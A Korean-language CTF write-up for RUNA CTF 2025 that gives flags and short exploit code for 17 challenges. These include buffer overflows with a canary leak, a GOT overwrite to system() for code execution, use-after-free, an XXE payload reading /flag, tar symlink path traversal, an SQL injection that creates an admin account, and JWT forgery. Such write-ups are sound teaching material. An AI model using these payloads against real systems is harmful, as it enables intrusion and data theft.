# RUNA CTF 2025 Write-up

## 풀이 문제들

### 1. 팔 (ARM64 Reversing)
**Flag**: `runa2025{Can_you_r3ad_code_data_in_newbie_rev}`

ARM64 바이너리, 실행해도 아무것도 안나옴. `.data` 섹션에 포인터 배열이 있고 각각이 `.rodata`의 문자를 가리킴.

**Exploit**:
```bash
readelf -x .data for_user
```
포인터들 순서대로 따라가서 flag 재구성함.

---

### 2. yeezyBof (Basic Buffer Overflow)
**Flag**: `runa2025{4nd_I_Always_FInD_yEAh_I_Alw4yS_find_soMeTh1nG_wrON9}`

기본 BOF. `gets()` 취약점, win 함수 있음. Offset 72바이트.

**Exploit**:
```python
from pwn import *
p = remote('pwn.runa2025.kr', 7001)
payload = b'A' * 72 + p64(0x4011f6)
p.sendline(payload)
p.interactive()
```

---

### 3. peezyBof (Canary Leak + Buffer Overflow)
**Flag**: `runa2025{brACE_yourSE1F_1ll_taKE_y0u_on_4_7rip_dOwn_MEmory_1ANe}`

Canary 있는 BOF. Canary LSB는 항상 0x00이라서 이걸 덮어쓰고 leak함.

**Exploit**:
```python
# Canary leak
payload = b'A' * 40 + b'\xff'
p.send(payload)
leaked = p.recvline()
canary = u64(b'\x00' + leaked[40:47])

# BOF
payload = b'A' * 40 + p64(canary) + b'B' * 8 + p64(win_addr)
```

---

### 4. sasuke_dular (Negative Index GOT Overwrite)
**Flag**: `runa2025{jESu5_C4NT_Sav3_yOu_lIFE_574rtS_whEn_7He_cHurCh_END}`

일정관리 프로그램. normalize_day_input에서 음수를 그대로 리턴하는 버그있음. 음수 인덱스로 GOT 덮어씀.

**핵심**:
- day=-2로 puts@GOT 주소 leak  
- day=-1로 strtol@GOT를 system으로 덮어씀
- strtol(user_input) → system(user_input) 되어서 RCE

**Exploit**:
```python
# Phase 1: libc leak (day=-2)
show(p, -2)
puts_addr = u64(leaked_data[marker_pos:marker_pos+8])
system_addr = puts_addr - 0x87be0 + 0x58750

# Phase 2: GOT overwrite (day=-1)
register(p, -1, 8, 9, p64(system_addr))

# Phase 3: RCE
p.sendline(b'cat flag.txt')
```

---

### 5. out may be in (Number Baseball)
**Flag**: `runa2025{number_baseball_r3v3rs3_3ng1n33r1ng_is_fun}`

숫자야구 게임. 바이너리 까보니까 237점 달성하면 플래그. 10S+5B-3O=237, S+B+O=25 조건에서 24S+1O=237이므로 S=24, B=0, O=1.

정답은 71395. 4번 맞히고(20S) 1번 틀리면(4S+1O) 됨.

**Exploit**:
```python
from pwn import *
p = remote('rev.runa2025.kr', 5008)
answer = "71395"

# 4번 맞히기
for i in range(4):
    p.sendlineafter(b'> ', answer.encode())

# 1번 틀리기  
p.sendlineafter(b'> ', b'71390')
```

---

### 6. Just read this
**Flag**: `runa2025{4f7b419b18d597cbabb9e4595b1c2172caac43b72c9fa65218fb1c74e3255335}`

7zip으로 열어보니까 그냥 flag 있었음.

---

### 7. heap-hop (UAF)
**Flag**: `runa2025{JusT_come_outS1DE_fOr_ThE_nIGHT_}`

UAF 문제. secret_menu(96873)로 플래그 읽어서 malloc하고 바로 free함. 근데 user_cnt 안올라가서 다음 malloc에서 같은 청크 재사용됨.

**Exploit**:
```python
# 첫번째 유저 추가
add_user(p, "user0")
# secret menu로 flag 읽기 + free
p.sendlineafter(b'>>', b'96873')  
# 두번째 유저 추가 (재사용)
add_user(p, "admin")
# 정보 확인하면 flag 나옴
show_users(p)
```

---

### 8. Assem..ble?
**Flag**: `runa2025{a164ace93f9455bea57c6cc6b7eba246fcb438a24b645a4d698adfbc4440273907ddbb85acee0f814692a498a76a73e36692de769f3f6a7a2350e6cafdace462}`

문자를 bit shuffle하고 XOR하고 테이블 lookup하는 알고리즘. 역산해서 각 위치별로 맞는 문자 찾으면 됨.

비트셔플: 0→5, 1→6, 2→7, 3→0, 4→1, 5→2, 6→3, 7→4

.data 섹션에 인코딩된 플래그 있어서 디코딩했더니 나옴.

---

### 9. GET out of there!
**Flag**: `runa2025{Welcome_to_RUNA_CTF_enjoyyy!!!!}`

HTTP 요청 문제. HEAD method로 쿼리 날리면 X-Flag 헤더에 플래그 줌.

**Exploit**:
```bash
curl -I "http://web.runa2025.kr:5002/test?query=value"
```

---

### 10. P2PE (PE 수정)
**Flag**: `runa2025{y0u_und3rst4nd_PE_file_structur3}`

PE파일 헤더가 깨져있었음. DOS Magic(4D5A)랑 PE offset(F8) 고쳐주니까 실행됨.

**Exploit**:
```python
data[0:2] = b'\x4D\x5A'  # MZ
data[0x3C:0x40] = struct.pack('<I', 0xF8)  # PE offset
```

---

### 11. Shototsu (MD4 Collision)
**Flag**: `runa2025{md4_collision_is_really_danger_crypt0system_and_so_many_pair}`

MD4 해시 충돌. 기본 충돌 메시지에 null byte 하나씩 붙여서 제출하면 됨.

**Exploit**:
```python
m1 = base_collision_1 + b'\x00'
m2 = base_collision_2 + b'\x00'
```

---

### 12. Zeckendorf
**Flag**: `runa2025{a357118d0694a8bfb9df30487407a3fae9f968971bc3f6accc962a13038e21c3}`

피보나치 수로 정수 표현하는 문제. 비트스트림을 12비트씩 끊어서 각 비트가 피보나치 수 포함 여부 나타냄.

**Exploit**:
```python
for i in range(74):
    bits = bitstream[i*12:(i+1)*12]
    value = sum(FIBONACCI[j] for j in range(12) if bits[j] == '1')
    flag += chr(value)
```

---

### 13. Redeem Code (JWT)
**Flag**: `runa2025{bcrypt_truncation_ftw}`

JWT 토큰 위조. ADMIN_SECRET이 빈 문자열이어서 그냥 bcrypt로 체크 우회 가능했음.

payload.admin = true로 설정하고 빈 시크릿으로 서명하면 됨.

---

## 팀원 문제들

### 14. paarang (XXE)
**Flag**: `runa2025{Fiction_Disclaimer:This_is_a_Work_of_Fiction..Names,events,incidents_are_either_the....}`

GPX 파일 업로드하는 웹 문제. XML 파싱할 때 XXE(External Entity) 막아놓지 않았음.

**Exploit**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE gpx [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<gpx version="1.1">
  <trk>
    <name>&xxe;</name>
  </trk>
</gpx>
```

---

### 15. RunaLab (Path Traversal)
**Flag**: `runa2025{aa418544fbfed4a02b2dd21041180e9457f66b13a6d1aaea5f34bfc0dcb71780}`

tar 업로드 기능 있는 웹사이트. 심볼릭 링크 검증 안하고 있었음.

**Exploit**:
```bash
mkdir exploit_dir
cd exploit_dir
ln -s /flag flag.txt
tar -cf ../exploit.tar .
```

웹사이트 Import 기능으로 exploit.tar 업로드하고 Workspace Tree에서 flag.txt 클릭하니까 플래그 읽힘.

---

### 16. 수상한 신입 (SQL Injection)
**Flag**: `runa2025{SQLi_is_veryvery_dangerous!}`

회원가입할 때 f-string으로 SQL 쿼리 만드는데 입력값 검증 없었음.

**Exploit**:
```python
# 회원가입 폼에서 username 필드에 입력
username = "dummy'), ('master', 'masterpw', 'master');--"
```

이렇게 하면 내 계정과 master 권한 계정 2개가 동시에 생성됨. master로 로그인하니까 프로필에서 플래그 나옴.

---

### 17. 성적관리시스템 (AES-GCM Nonce Reuse)
**Flag**: `runa2025{your_holy_genius_will_A+_for_cryptographic_thinking!}`

AES-GCM 쓰는데 nonce 재사용하고 있었음. GCM에서 nonce 재사용하면 인증키 복구 가능함.

**Exploit**:
```python
from pwn import *
from Cryptodome.Cipher import AES

# 1. 서버에서 같은 nonce로 암호화된 두 ciphertext 수집
# 2. GCM nonce reuse로 auth key 복구
# 3. AAD = Key 조건 이용해서 암호화키 역산
# 4. 플래그 복호화
cipher = AES.new(recovered_key, AES.MODE_GCM, nonce=nonce)
flag = cipher.decrypt(flag_ciphertext)
```

---

## 총평

총 17개 문제 풀었음. pwn, rev, crypto, web 다 골고루 있어서 재미있었음. 
특히 sasuke_dular랑 성적관리시스템이 어려웠는데 많이 배웠음.
